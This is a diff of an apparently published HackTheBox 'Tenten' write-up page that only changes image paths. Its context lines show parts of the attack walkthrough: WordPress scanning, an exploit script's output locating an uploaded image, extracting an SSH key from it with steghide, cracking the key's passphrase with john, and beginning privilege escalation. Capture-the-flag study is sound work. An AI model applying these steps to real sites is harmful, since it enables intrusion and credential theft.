@@ -31,7 +31,7 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.18 (Ubuntu)
 |_http-title: Did not follow redirect to http://tenten.htb/
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre><ul><li>Web Server</li></ul><p><img src=./images/1.png></p><ul><li><code>wpscan</code></li></ul><pre tabindex=0><code>└─$ wpscan --url http://tenten.htb                                                                    
+</code></pre><ul><li>Web Server</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenten/images/1.png></p><ul><li><code>wpscan</code></li></ul><pre tabindex=0><code>└─$ wpscan --url http://tenten.htb                                                                    
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -211,7 +211,7 @@ Versions: &lt;=0.7.25
 Enter a vulnerable website: http://tenten.htb/
 Enter a file name: HackerAccessGranted
 [+] URL of CV found! http://tenten.htb//wp-content/uploads/2017/04/HackerAccessGranted.jpg
-</code></pre><ul><li>Image<ul><li><a href=http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg target=_blank rel=noopener>http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg</a></li></ul></li></ul><p><img src=./images/2.png></p><ul><li>So it looks like it could be <code>stenography</code></li></ul><pre tabindex=0><code>└─$ steghide extract -sf HackerAccessGranted.jpg 
+</code></pre><ul><li>Image<ul><li><a href=http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg target=_blank rel=noopener>http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg</a></li></ul></li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenten/images/2.png></p><ul><li>So it looks like it could be <code>stenography</code></li></ul><pre tabindex=0><code>└─$ steghide extract -sf HackerAccessGranted.jpg 
 Enter passphrase: 
 the file &#34;id_rsa&#34; does already exist. overwrite ? (y/n) y
 wrote extracted data to &#34;id_rsa&#34;.
@@ -258,7 +258,7 @@ superpassword    (id_rsa)
 1g 0:00:00:00 DONE (2023-09-02 11:43) 3.333g/s 2600Kp/s 2600Kc/s 2600KC/s superpene..supermoy
 Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed. 
-</code></pre><ul><li>We can try a username <code>takis</code> from website</li></ul><p><img src=./images/3.png></p><p><img src=./images/4.png></p><h2 id=root>Root</h2><ul><li><code>sudo -l</code></li></ul><pre tabindex=0><code>takis@tenten:~$ sudo -l
+</code></pre><ul><li>We can try a username <code>takis</code> from website</li></ul><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenten/images/3.png></p><p><img src=/posts/cybersecurity/hackthebox/machines/linux/tenten/images/4.png></p><h2 id=root>Root</h2><ul><li><code>sudo -l</code></li></ul><pre tabindex=0><code>takis@tenten:~$ sudo -l
 Matching Defaults entries for takis on tenten:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
